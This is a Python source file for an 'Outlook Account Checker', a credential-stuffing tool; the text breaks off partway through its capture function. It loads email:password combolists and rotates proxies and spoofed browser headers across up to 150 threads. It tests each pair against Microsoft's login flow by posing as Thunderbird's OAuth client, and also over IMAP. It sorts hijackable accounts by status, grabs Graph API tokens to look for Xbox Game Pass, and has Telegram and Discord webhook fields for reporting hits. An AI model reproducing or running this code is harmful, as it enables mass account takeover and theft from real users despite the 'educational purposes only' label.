#!/usr/bin/env python3
# pyright: reportMissingImports=false
"""
Super Fast Outlook Account Checker with Premium Dashboard
Educational purposes only.
"""

# ============================================================================
# IMPORTS
# ============================================================================

import asyncio
import collections
import concurrent.futures
import copy
import csv
import ctypes
import email
import gc
import imaplib
import io
import itertools
import json
import logging
import mmap
import os
import queue
import random
import re
import shutil
import socket
import ssl
import subprocess
import sys
import threading
import time
import uuid
from collections import deque
from datetime import datetime, timezone
from email.header import decode_header
from typing import Any, Callable, Dict, List, Optional, Tuple, Union

import flask
import httpx
from colorama import Fore, Style, init
from flask import Flask, Response, jsonify, request

# Optional imports
try:
    from curl_cffi.requests import Session as CurlSession
    HAS_CURL_CFFI = True
except ImportError:
    HAS_CURL_CFFI = False

try:
    from playwright.async_api import async_playwright
    HAS_PLAYWRIGHT = True
except ImportError:
    HAS_PLAYWRIGHT = False

# ============================================================================
# CONFIG
# ============================================================================

DEFAULT_CONFIG = {
    "max_retries": 3,
    "rate_limit_base_delay": 5,
    "rate_limit_max_delay": 60,
    "session_save_interval": 50,
    "proxy_type": "http",
    "telegram_bot_token": "",
    "telegram_chat_id": "",
    "discord_webhook_url": "",
    "capture_enabled": True,
    "imap_check_enabled": False,
    "web_dashboard_enabled": True,
    "web_dashboard_port": 8080,
}

CONFIG = DEFAULT_CONFIG.copy()


def load_config():
    global CONFIG
    config_file = "config.json"
    try:
        # Check if file exists and is not empty
        if os.path.exists(config_file) and os.path.getsize(config_file) > 0:
            with open(config_file, "r") as f:
                loaded = json.load(f)
        else:
            loaded = {}
    except (json.JSONDecodeError, OSError):
        # If file is corrupt or unreadable, treat as empty
        loaded = {}

    # Merge with defaults – any missing keys get default values
    merged = DEFAULT_CONFIG.copy()
    merged.update(loaded)
    CONFIG = merged

    # Write back defaults if the file was missing, empty, or missing keys
    if not os.path.exists(config_file) or os.path.getsize(config_file) == 0 or set(loaded.keys()) != set(DEFAULT_CONFIG.keys()):
        try:
            with open(config_file, "w") as f:
                json.dump(CONFIG, f, indent=4)
        except Exception:
            pass  # Don't crash if we can't write; we still have CONFIG in memory


load_config()


# ============================================================================
# CONSTANTS & UTILITY HELPERS (from utils.py and others)
# ============================================================================

COMBOLIST_FILE = "input/combolist.txt"
VALID_OUTPUT_FILE = "output/valid.txt"
PROXIES_FILE = "input/proxies.txt"
BATCH_SIZE = 1000
MAX_QUEUE_SIZE = 5000
SESSION_FILE = ".session"
BUFFER_FLUSH_SIZE = 100

start_time = None
should_update_title = True
title_update_thread = None
thread_restart_enabled = True
threads_list = []
target_thread_count = 1
combo_queue = queue.Queue(maxsize=MAX_QUEUE_SIZE)
combo_file_position = 0
combo_file_size = 0
total_combos = 0
proxy_iterator = None
proxy_mode = False
supported_proxy_types = ["http", "https", "socks4", "socks5"]
output_buffers = {}
buffer_sizes = {}
dashboard_instance = None
rate_limit_event = threading.Event()

# Counters
valid_count = 0
twofa_count = 0
consent_count = 0
pending_security_count = 0
locked_count = 0
recovery_count = 0
password_count = 0
not_exist_count = 0
invalid_count = 0
failed_count = 0
rate_limited_count = 0
imap_valid_count = 0

# Locks
file_lock = threading.Lock()
counters_lock = threading.Lock()
proxy_lock = threading.Lock()
print_lock = threading.Lock()
title_lock = threading.Lock()
threads_lock = threading.Lock()
queue_lock = threading.Lock()

# Email validation
EMAIL_REGEX = re.compile(r'^[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}$')

# ----------------------------------------------------------------------------
# Utility functions
# ----------------------------------------------------------------------------


def check_windows_only():
    pass


def set_start_time():
    global start_time
    start_time = time.time()


def get_time():
    return datetime.now().strftime("%H:%M:%S")


def get_runtime():
    if start_time is None:
        return "00:00:00"
    elapsed = time.time() - start_time
    hours = int(elapsed // 3600)
    minutes = int((elapsed % 3600) // 60)
    seconds = int(elapsed % 60)
    return f"{hours:02d}:{minutes:02d}:{seconds:02d}"


def safe_print(message):
    with print_lock:
        print(message + Style.RESET_ALL)


def vprint(thread_num, status, account):
    if dashboard_instance:
        dashboard_instance.log_event(thread_num, status, account)
    else:
        message = f"{Fore.LIGHTCYAN_EX}{get_time()} {Fore.WHITE}/ {Fore.LIGHTBLACK_EX}Thread-{int(thread_num):02} {Fore.WHITE}/ {Fore.GREEN}{status} {Fore.WHITE}/ {Fore.LIGHTGREEN_EX}{account}"
        safe_print(message)


def iprint(thread_num, status, account):
    if dashboard_instance:
        dashboard_instance.log_event(thread_num, status, account)
    else:
        message = f"{Fore.LIGHTCYAN_EX}{get_time()} {Fore.WHITE}/ {Fore.LIGHTBLACK_EX}Thread-{int(thread_num):02} {Fore.WHITE}/ {Fore.RED}{status} {Fore.WHITE}/ {Fore.LIGHTBLACK_EX}{account}"
        safe_print(message)


def oprint(thread_num, status, account):
    if dashboard_instance:
        dashboard_instance.log_event(thread_num, status, account)
    else:
        message = f"{Fore.LIGHTCYAN_EX}{get_time()} {Fore.WHITE}/ {Fore.LIGHTBLACK_EX}Thread-{int(thread_num):02} {Fore.WHITE}/ {Fore.YELLOW}{status} {Fore.WHITE}/ {Fore.LIGHTBLACK_EX}{account}"
        safe_print(message)


def eprint(text):
    if dashboard_instance:
        dashboard_instance.log_event(0, "ERROR", text)
    else:
        message = f"{Fore.LIGHTCYAN_EX}{get_time()} {Fore.WHITE}/ {Fore.RED}ERROR {Fore.WHITE}/ {Fore.LIGHTRED_EX}{text}"
        safe_print(message)


def set_console_title(title):
    if os.name == "nt":
        try:
            ctypes.windll.kernel32.SetConsoleTitleW(title)
        except:
            pass
    else:
        try:
            sys.stdout.write(f"\033]2;{title}\007")
            sys.stdout.flush()
        except:
            pass


def get_active_worker_threads():
    with threads_lock:
        return sum(1 for t in threads_list if t.is_alive())


def update_title():
    if dashboard_instance:
        return
    with title_lock:
        with counters_lock:
            checked = (valid_count + twofa_count + consent_count +
                       pending_security_count + locked_count +
                       recovery_count + password_count + not_exist_count +
                       invalid_count + failed_count + rate_limited_count + imap_valid_count)
            remaining = total_combos - checked
            total_valid = valid_count + twofa_count + consent_count + \
                pending_security_count + imap_valid_count
            total_invalid = (locked_count + recovery_count + password_count +
                             not_exist_count + invalid_count)

        runtime = get_runtime()
        active_threads = get_active_worker_threads()

        set_console_title(
            f"Outlook Checker | Runtime: {runtime} | Threads: {active_threads}/{target_thread_count} | Checked: {checked:,}/{total_combos:,} | Valid: {total_valid:,} | Invalid: {total_invalid:,} | Failed: {failed_count:,} | Remaining: {remaining:,}")


def title_updater():
    while should_update_title:
        update_title()
        time.sleep(1)


def ensure_output_folder():
    folders = [
        "output",
        "output/others",
        "output/capture"          # <-- new
    ]
    for folder in folders:
        if not os.path.exists(folder):
            try:
                os.makedirs(folder)
            except Exception as e:
                eprint(f"Could not create folder '{folder}': {e}")


def count_lines_fast(filename):
    try:
        with open(filename, 'rb') as f:
            with mmap.mmap(f.fileno(), 0, access=mmap.ACCESS_READ) as mm:
                return mm.count(b'\n')
    except:
        count = 0
        with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
            for _ in f:
                count += 1
        return count


def read_batch(filename, current_position, batch_size=BATCH_SIZE):
    combos = []
    invalid_count = 0
    file_size = os.path.getsize(filename)
    try:
        with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
            f.seek(current_position)
            for _ in range(batch_size):
                line = f.readline()
                if not line:
                    break
                combo = line.strip()
                if combo and ':' in combo:
                    combos.append(combo)
                elif combo:
                    invalid_count += 1
            new_position = f.tell()
    except Exception as e:
        eprint(f"Error reading batch: {e}")
        return [], 0, current_position, True
    return combos, invalid_count, new_position, new_position >= file_size


def preprocess_combo_file(filename):
    backup_filename = filename + ".backup"
    temp_filename = filename + ".temp"
    if os.path.exists(backup_filename):
        os.remove(backup_filename)
    safe_print(f"{Fore.LIGHTCYAN_EX}Processing combo list...{Style.RESET_ALL}")
    if not os.path.exists(filename):
        safe_print(
            f"{Fore.YELLOW}Combo file '{filename}' not found. Creating it...")
        try:
            os.makedirs(os.path.dirname(filename), exist_ok=True)
            with open(filename, "w", encoding="utf-8") as f:
                f.write("")
            safe_print(f"{Fore.GREEN}Created '{filename}'.")
            eprint(
                "Please add at least one combo in the following format: 'email:password'.")
            return False, 0, 0, 0, 0
        except Exception as e:
            eprint(f"Error creating combo file: {e}")
            return False, 0, 0, 0, 0
    try:
        shutil.copy2(filename, backup_filename)
        seen_combos = set()
        valid_combos = []
        duplicate_count = 0
        invalid_format_count = 0
        invalid_email_count = 0
        total_lines = 0
        with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                total_lines += 1
                combo = line.strip().strip('\x00\x0b\x0c\r\n\t')
                if not combo:
                    continue
                if ':' not in combo:
                    invalid_format_count += 1
                    continue
                email_part = combo.split(':', 1)[0].strip()
                if not EMAIL_REGEX.match(email_part):
                    invalid_email_count += 1
                    continue
                combo_lower = combo.lower()
                if combo_lower in seen_combos:
                    duplicate_count += 1
                else:
                    seen_combos.add(combo_lower)
                    valid_combos.append(combo)
        with open(temp_filename, 'w', encoding='utf-8') as f:
            for combo in valid_combos:
                f.write(combo + '\n')
        os.replace(temp_filename, filename)
        if os.path.exists(backup_filename):
            os.remove(backup_filename)
        return True, len(valid_combos), duplicate_count, invalid_format_count, invalid_email_count
    except Exception as e:
        eprint(f"Error during preprocessing: {e}")
        if os.path.exists(backup_filename):
            try:
                os.replace(backup_filename, filename)
            except:
                pass
        return False, 0, 0, 0, 0


def load_combos_optimized(filename):
    global total_combos, combo_file_size
    if not os.path.exists(filename):
        eprint(f"Combo file '{filename}' not found.")
        return False
    try:
        total_combos = count_lines_fast(filename)
        combo_file_size = os.path.getsize(filename)
        if total_combos == 0:
            eprint(f"Combolist is empty. (File location: '{filename}')")
            eprint(
                "Please add at least one combo in the following format: 'email:password'.")
            return False
        return True
    except Exception as e:
        eprint(f"Failed to analyze combo file: {e}")
        return False


def update_counter(reason):
    global valid_count, twofa_count, consent_count, pending_security_count, locked_count
    global recovery_count, password_count, not_exist_count
    global invalid_count, failed_count, rate_limited_count, imap_valid_count
    with counters_lock:
        if reason == "valid":
            valid_count += 1
        elif reason == "2fa":
            twofa_count += 1
        elif reason == "consent":
            consent_count += 1
        elif reason == "pending_security":
            pending_security_count += 1
        elif reason == "locked":
            locked_count += 1
        elif reason == "recovery":
            recovery_count += 1
        elif reason == "password":
            password_count += 1
        elif reason == "not_exist":
            not_exist_count += 1
        elif reason == "invalid":
            invalid_count += 1
        elif reason == "failed":
            failed_count += 1
        elif reason == "rate_limited":
            rate_limited_count += 1
        elif reason == "imap_valid":
            imap_valid_count += 1


def get_all_counters():
    with counters_lock:
        return {
            'valid': valid_count,
            '2fa': twofa_count,
            'consent': consent_count,
            'pending_security': pending_security_count,
            'locked': locked_count,
            'recovery': recovery_count,
            'password': password_count,
            'not_exist': not_exist_count,
            'invalid': invalid_count,
            'failed': failed_count,
            'rate_limited': rate_limited_count,
            'imap_valid': imap_valid_count
        }


def restore_counters(counters_dict):
    global valid_count, twofa_count, consent_count, pending_security_count
    global locked_count, recovery_count, password_count, not_exist_count
    global invalid_count, failed_count, rate_limited_count, imap_valid_count
    with counters_lock:
        valid_count = counters_dict.get('valid', 0)
        twofa_count = counters_dict.get('2fa', 0)
        consent_count = counters_dict.get('consent', 0)
        pending_security_count = counters_dict.get('pending_security', 0)
        locked_count = counters_dict.get('locked', 0)
        recovery_count = counters_dict.get('recovery', 0)
        password_count = counters_dict.get('password', 0)
        not_exist_count = counters_dict.get('not_exist', 0)
        invalid_count = counters_dict.get('invalid', 0)
        failed_count = counters_dict.get('failed', 0)
        rate_limited_count = counters_dict.get('rate_limited', 0)
        imap_valid_count = counters_dict.get('imap_valid', 0)


def write_to_file_buffered(file_path, account):
    global output_buffers, buffer_sizes
    with file_lock:
        if file_path not in output_buffers:
            output_buffers[file_path] = []
            buffer_sizes[file_path] = 0
        output_buffers[file_path].append(account)
        buffer_sizes[file_path] += 1
        if buffer_sizes[file_path] >= BUFFER_FLUSH_SIZE:
            flush_buffer(file_path)


def flush_buffer(file_path):
    global output_buffers, buffer_sizes
    if file_path in output_buffers and output_buffers[file_path]:
        try:
            directory = os.path.dirname(file_path)
            if directory and not os.path.exists(directory):
                os.makedirs(directory)
            with open(file_path, "a", encoding="utf-8") as f:
                for account in output_buffers[file_path]:
                    f.write(account + "\n")
            output_buffers[file_path] = []
            buffer_sizes[file_path] = 0
        except Exception as e:
            eprint(f"Failed to flush buffer to {file_path}: {e}")


def flush_all_buffers():
    with file_lock:
        for file_path in list(output_buffers.keys()):
            if buffer_sizes.get(file_path, 0) > 0:
                flush_buffer(file_path)


def combo_feeder():
    global combo_file_position, thread_restart_enabled, combo_queue
    total_invalid = 0
    while thread_restart_enabled:
        try:
            if combo_queue.qsize() < MAX_QUEUE_SIZE // 2:
                combos, invalid_count, combo_file_position, is_done = read_batch(
                    COMBOLIST_FILE, combo_file_position, BATCH_SIZE
                )
                total_invalid += invalid_count
                for combo in combos:
                    if not thread_restart_enabled:
                        break
                    try:
                        combo_queue.put(combo, timeout=1)
                    except queue.Full:
                        time.sleep(0.1)
                        break
                if is_done:
                    break
            else:
                time.sleep(0.1)
        except Exception as e:
            eprint(f"Error in combo feeder: {e}")
            time.sleep(1)


def cleanup_dead_threads():
    with threads_lock:
        global threads_list
        threads_list = [t for t in threads_list if t.is_alive()]


def start_worker_thread(thread_id, checker_func):
    thread = threading.Thread(target=checker_func, args=(
        thread_id,), name=f"Worker-{thread_id}")
    thread.daemon = True
    thread.start()
    with threads_lock:
        threads_list.append(thread)
    return thread


def thread_monitor(checker_func):
    global thread_restart_enabled, combo_queue, combo_file_position, combo_file_size, target_thread_count
    thread_counter = 1
    last_flush = time.time()
    while thread_restart_enabled:
        cleanup_dead_threads()
        active_count = get_active_worker_threads()
        if active_count < target_thread_count and (not combo_queue.empty() or
                                                   combo_file_position < combo_file_size):
            needed_threads = target_thread_count - active_count
            for _ in range(needed_threads):
                start_worker_thread(thread_counter, checker_func)
                thread_counter += 1
                time.sleep(0.05)
        if time.time() - last_flush > 10:
            flush_all_buffers()
            last_flush = time.time()
        if combo_queue.empty() and combo_file_position >= combo_file_size and active_count == 0:
            break
        time.sleep(1)


def input_thread_count():
    global target_thread_count
    while True:
        try:
            thread_count = input(
                f"{Fore.LIGHTBLUE_EX}  > Enter number of threads (1-150): {Style.RESET_ALL}")
            if thread_count.isdigit():
                thread_count = int(thread_count)
                if 1 <= thread_count <= 150:   # changed from 50 to 150
                    target_thread_count = thread_count
                    os.system('clear' if os.name != 'nt' else 'cls')
                    return thread_count
                else:
                    eprint("Please enter a number between 1 and 150.")
            else:
                eprint("Invalid input. Only numbers are allowed.")
        except (EOFError, KeyboardInterrupt):
            safe_print(f"\n{Fore.RED}Program interrupted by user.")
            return None


def load_proxies(filename):
    if not os.path.exists(filename):
        return []
    try:
        with open(filename, "r", encoding="utf-8") as f:
            proxies = [line.strip() for line in f if line.strip()]
    except Exception:
        return []
    if len(proxies) == 1 and proxies[0] == "username:password@host:port":
        return []
    return proxies


def init_proxy_iterator(proxy_list, proxy_type):
    global proxy_iterator
    if proxy_type not in supported_proxy_types:
        return False
    if not proxy_list:
        return False
    formatted = [
        f"{proxy_type}://{p.strip()}" for p in proxy_list if p.strip()]
    if formatted:
        proxy_iterator = itertools.cycle(formatted)
        return True
    return False


def get_next_proxy():
    global proxy_iterator
    with proxy_lock:
        if proxy_iterator is None:
            return None
        return next(proxy_iterator)


def setup_proxies():
    global proxy_mode
    proxies = load_proxies(PROXIES_FILE)
    if proxies:
        proxy_type = CONFIG.get('proxy_type', 'http')
        if init_proxy_iterator(proxies, proxy_type):
            proxy_mode = True
            safe_print(
                f"{Fore.LIGHTGREEN_EX}🔄 Loaded {len(proxies):,} proxies ({proxy_type} mode){Style.RESET_ALL}")
            return True
    proxy_mode = False
    return False


def print_analysis_report():
    end_time = time.time()
    total_runtime = end_time - start_time if start_time else 0
    flush_all_buffers()
    with counters_lock:
        total_checked = (valid_count + twofa_count + consent_count +
                         pending_security_count + locked_count +
                         recovery_count + password_count + not_exist_count +
                         invalid_count + failed_count + rate_limited_count + imap_valid_count)
        total_valid = valid_count + twofa_count + consent_count + \
            pending_security_count + imap_valid_count
        total_invalid = (locked_count + recovery_count + password_count +
                         not_exist_count + invalid_count)
    avg_speed = total_checked / total_runtime if total_runtime > 0 else 0
    success_rate = (total_valid / total_checked *
                    100) if total_checked > 0 else 0
    print("\n")
    print(f"{Fore.WHITE}=" * 80)
    print()
    print(f"{Fore.RED}                 🎯 FINAL SUMMARY - OUTLOOK CHECKER RESULTS 🎯{Style.RESET_ALL}")
    print()
    print(f"{Fore.WHITE}=" * 80)
    print()
    print(f"{Fore.LIGHTBLUE_EX}⏱️ TIMING INFORMATION{Style.RESET_ALL}")
    print(
        f"   Total duration:      {Fore.YELLOW}{get_runtime()}{Style.RESET_ALL}")
    print(
        f"   Average speed:       {Fore.GREEN}{avg_speed:.2f} accounts/second{Style.RESET_ALL}")
    print()
    print(f"{Fore.LIGHTMAGENTA_EX}📊 OVERALL STATISTICS{Style.RESET_ALL}")
    print(
        f"   Total loaded:        {Fore.WHITE}{total_combos:,}{Style.RESET_ALL}")
    print(
        f"   Total checked:       {Fore.WHITE}{total_checked:,}{Style.RESET_ALL}")
    print(
        f"   Success rate:        {Fore.GREEN}{success_rate:.2f}%{Style.RESET_ALL}")
    if proxy_mode:
        print(f"   Proxy mode:          {Fore.CYAN}Enabled{Style.RESET_ALL}")
    print()
    print(f"{Fore.GREEN}✅ VALID ACCOUNTS{Style.RESET_ALL}")
    print(
        f"   ├─ Valid (clean):     {Fore.GREEN}{valid_count:,}{Style.RESET_ALL}")
    print(
        f"   ├─ Valid (2FA):       {Fore.CYAN}{twofa_count:,}{Style.RESET_ALL}")
    print(
        f"   ├─ Valid (consent):   {Fore.CYAN}{consent_count:,}{Style.RESET_ALL}")
    print(
        f"   ├─ Pending Security:  {Fore.GREEN}{pending_security_count:,}{Style.RESET_ALL}")
    print(
        f"   ├─ IMAP Valid:        {Fore.CYAN}{imap_valid_count:,}{Style.RESET_ALL}")
    print(
        f"   └── Total Valid:      {Fore.LIGHTGREEN_EX}{total_valid:,}{Style.RESET_ALL}")
    print()
    print(f"{Fore.RED}❌ INVALID & OTHER RESULTS{Style.RESET_ALL}")
    print(
        f"   ├─ Locked:            {Fore.YELLOW}{locked_count:,}{Style.RESET_ALL}")
    print(
        f"   ├─ Recovery needed:   {Fore.YELLOW}{recovery_count:,}{Style.RESET_ALL}")
    print(
        f"   ├─ Wrong password:    {Fore.RED}{password_count:,}{Style.RESET_ALL}")
    print(
        f"   ├─ Account not exist: {Fore.RED}{not_exist_count:,}{Style.RESET_ALL}")
    print(
        f"   ├─ Invalid format:    {Fore.RED}{invalid_count:,}{Style.RESET_ALL}")
    print(
        f"   ├─ Rate limited:      {Fore.MAGENTA}{rate_limited_count:,}{Style.RESET_ALL}")
    print(
        f"   ├─ Failed checks:     {Fore.RED}{failed_count:,}{Style.RESET_ALL}")
    print(
        f"   └── Total invalid:    {Fore.LIGHTRED_EX}{total_invalid:,}{Style.RESET_ALL}")


def safe_exit():
    try:
        input(f"\n{Fore.LIGHTMAGENTA_EX}Press Enter to exit...{Style.RESET_ALL}")
    except (EOFError, ValueError, KeyboardInterrupt):
        time.sleep(10)


# ============================================================================
# HEADERS (from headers.py)
# ============================================================================

def headers1():
    return {
        "connection": "keep-alive",
        "upgrade-insecure-requests": "1",
        "user-agent": "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.201 Mobile Safari/537.36",
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "sec-fetch-site": "none",
        "sec-fetch-mode": "navigate",
        "sec-fetch-dest": "document",
        "referer": "android-app://net.thunderbird.android/",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "en-US,en;q=0.9"
    }


def headers2():
    return {
        "connection": "keep-alive",
        "upgrade-insecure-requests": "1",
        "user-agent": "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.201 Mobile Safari/537.36",
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "sec-fetch-site": "none",
        "sec-fetch-mode": "navigate",
        "sec-fetch-dest": "document",
        "referer": "android-app://net.thunderbird.android/",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "en-US,en;q=0.9"
    }


def headers3(redirect_url):
    return {
        "connection": "keep-alive",
        "cache-control": "max-age=0",
        "upgrade-insecure-requests": "1",
        "origin": "https://login.live.com",
        "content-type": "application/x-www-form-urlencoded",
        "user-agent": "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.201 Mobile Safari/537.36",
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "sec-fetch-site": "same-origin",
        "sec-fetch-mode": "navigate",
        "sec-fetch-user": "?1",
        "sec-fetch-dest": "document",
        "referer": redirect_url,
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "en-US,en;q=0.9"
    }


# ============================================================================
# USER AGENT PROFILES (from useragent.py)
# ============================================================================

UA_PROFILES = [
    {'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
     'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"'},
    {'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
     'sec-ch-ua': '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"'},
    {'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
     'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"macOS"'},
    {'user-agent': 'Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.71 Mobile Safari/537.36',
     'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform': '"Android"'},
    {'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0',
     'sec-ch-ua': '', 'sec-ch-ua-mobile': '', 'sec-ch-ua-platform': ''},
    {'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15',
     'sec-ch-ua': '', 'sec-ch-ua-mobile': '', 'sec-ch-ua-platform': ''},
    {'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1',
     'sec-ch-ua': '', 'sec-ch-ua-mobile': '', 'sec-ch-ua-platform': ''},
]


class UAProfile:
    def __init__(self, profile=None):
        self.profile = profile or random.choice(UA_PROFILES)

    @property
    def user_agent(self):
        return self.profile['user-agent']

    def get_headers(self):
        headers = {'user-agent': self.profile['user-agent']}
        for key in ('sec-ch-ua', 'sec-ch-ua-mobile', 'sec-ch-ua-platform'):
            val = self.profile.get(key, '')
            if val:
                headers[key] = val
        return headers

    def is_mobile(self):
        return self.profile.get('sec-ch-ua-mobile') == '?1'

    def is_safari(self):
        return 'Safari' in self.profile['user-agent'] and 'Chrome' not in self.profile['user-agent']

    def is_firefox(self):
        return 'Firefox' in self.profile['user-agent']


def get_random_profile():
    return UAProfile()


def get_random_ua():
    return random.choice(UA_PROFILES)['user-agent']


# ============================================================================
# CHECKER FUNCTIONS
# ============================================================================

# ---- login.py (core check) ----
def check(email, password, proxy_url=None):
    retry_count = 0
    max_retries = CONFIG.get('max_retries', 3)
    account = f"{email}:{password}"
    while retry_count < max_retries:
        session = None
        try:
            client_kwargs = {'timeout': 30.0, 'follow_redirects': False}
            if proxy_url:
                client_kwargs['proxy'] = proxy_url
            session = httpx.Client(**client_kwargs)
            querystring = {
                "redirect_uri": "msauth://net.thunderbird.android/S9nqeF27sTJcEfaInpC%2BDHzHuCY%3D",
                "client_id": "e6f8716e-299d-4ed9-bbf3-453f192f44e5",
                "response_type": "code",
                "login_hint": email,
                "state": "fo3JQhpJE4m9QBlN2Rho4w",
                "nonce": "yB_pchsTbmenvX90Yqk7TA",
                "scope": "https://outlook.office.com/IMAP.AccessAsUser.All https://outlook.office.com/SMTP.Send offline_access",
                "code_challenge": "9U8TeNniUmMcmT1SkXG17prawHTT19xGIrhJfflNPW4",
                "code_challenge_method": "S256"
            }
            response = session.get(url="https://login.microsoftonline.com/common/oauth2/v2.0/authorize",
                                   headers=headers1(), params=querystring)
            if response.status_code == 429:
                return account, "rate_limited"
            if response.status_code != 302:
                retry_count += 1
                continue
            redirect_url = response.headers.get("Location")
            if not redirect_url:
                retry_count += 1
                continue
            response = session.get(redirect_url, headers=headers2())
            while response.status_code in (301, 302, 303, 307, 308):
                redirect_url = response.headers.get("Location")
                if not redirect_url:
                    break
                response = session.get(redirect_url, headers=headers2())
            if response.status_code == 429:
                return account, "rate_limited"
            if response.status_code != 200:
                retry_count += 1
                continue
            html = response.text
            ppft_match = re.search(
                r'name=\\?"PPFT\\?"[^>]*value=\\?"([^"\\]+)', html)
            if not ppft_match:
                ppft_match = re.search(
                    r'name="PPFT"[^>]*value="([^"]+)"', html)
            ppft = ppft_match.group(1) if ppft_match else ""
            pu_match = re.search(r'"urlPost"\s*:\s*"([^"]+)"', html)
            if not pu_match:
                pu_match = re.search(r"urlPost:'([^']+)'", html)
            post_url = pu_match.group(1) if pu_match else None
            if not post_url:
                retry_count += 1
                continue
            payload = {
                "ps": "2", "psRNGCDefaultType": "", "psRNGCEntropy": "",
                "psRNGCSLK": "", "canary": "", "ctx": "", "hpgrequestid": "",
                "PPFT": ppft, "PPSX": "PassportRN", "NewUser": "1",
                "FoundMSAs": "", "fspost": "0", "i21": "0",
                "CookieDisclosure": "0", "IsFidoSupported": "1",
                "isSignupPost": "0", "isRecoveryAttemptPost": "0", "i13": "1",
                "login": email, "loginfmt": email, "type": "11",
                "LoginOptions": "1", "lrt": "", "lrtPartition": "",
                "hisRegion": "", "hisScaleUnit": "", "passwd": password
            }
            response = session.post(
                post_url, data=payload, headers=headers3(redirect_url))
            if response.status_code == 429:
                return account, "rate_limited"
            while response.status_code in (301, 302, 303, 307, 308):
                new_url = response.headers.get("Location")
                if not new_url:
                    break
                if "?code=" in new_url:
                    return account, "valid"
                response = session.get(new_url, headers=headers2())
            if response.status_code == 429:
                return account, "rate_limited"
            if response.status_code != 200:
                retry_count += 1
                continue
            text = response.text
            location_header = response.headers.get("Location", "")
            if not text:
                if "?code=" in location_header:
                    return account, "valid"
                else:
                    return account, "other"
            if "action" in text:
                if "proofs" in text:
                    return account, "2fa"
                elif "Consent/Update" in text:
                    return account, "consent"
                elif "ar/cancel" in text:
                    return account, "pending_security"
                elif "Abuse?" in text:
                    return account, "locked"
                elif "recover?" in text:
                    return account, "recovery"
                else:
                    return account, "invalid"
            elif "Your account or password is incorrect" in text:
                return account, "password"
            elif "That Microsoft account doesn" in text:
                return account, "not_exist"
            else:
                return account, "invalid"
        except httpx.RequestError:
            retry_count += 1
        except httpx.TimeoutException:
            retry_count += 1
        except Exception:
            retry_count += 1
        finally:
            if session:
                session.close()
    return account, "failed"


# ---- imap_check.py ----
def imap_check(email, password):
    account = f"{email}:{password}"
    try:
        context = ssl.create_default_context()
        mail = imaplib.IMAP4_SSL(
            'outlook.office365.com', 993, ssl_context=context, timeout=10)
        try:
            mail.login(email, password)
        except imaplib.IMAP4.error:
            return account, "imap_failed"
        try:
            mail.logout()
        except Exception:
            pass
        return account, "imap_valid"
    except (imaplib.IMAP4.error, ConnectionRefusedError, TimeoutError, OSError, ssl.SSLError):
        return account, "imap_failed"
    except Exception:
        return account, "imap_failed"


# ---- capture.py (IMAP + Xbox) ----
# Remove the old check_xbox function entirely.
# Just keep this:

def capture_details(email, password):
    """Check if the account has Xbox Game Pass Ultimate via Graph API."""
    details = {}
    try:
        with httpx.Client(timeout=15) as client:
            token_payload = {
                'grant_type': 'password',
                'client_id': 'e6f8716e-299d-4ed9-bbf3-453f192f44e5',
                'scope': 'https://graph.microsoft.com/.default offline_access',
                'username': email,
                'password': password,
            }
            resp = client.post(
                'https://login.microsoftonline.com/common/oauth2/v2.0/token',
                data=token_payload
            )
            if resp.status_code == 200:
                token_data = resp.json()
                access_token = token_data.get('access_token')
                if access_token:
                    headers = {'Authorization': f'Bearer {access_token}'}
                    sub_resp = client.get(
                        'https://graph.microsoft.com/v1.0/me/subscribedSkus',
                        headers=headers
                    )
                    if sub_resp.status_code == 200:
                        skus = sub_resp.json().get('value', [])
                        gpu_skus = {
                            "XBOX_GAME_PASS_ULTIMATE",
                            "XBOXGAMEPASS_ULTIMATE",
                            "GAME_PASS_ULTIMATE",
                        }
                        has_gpu = any(
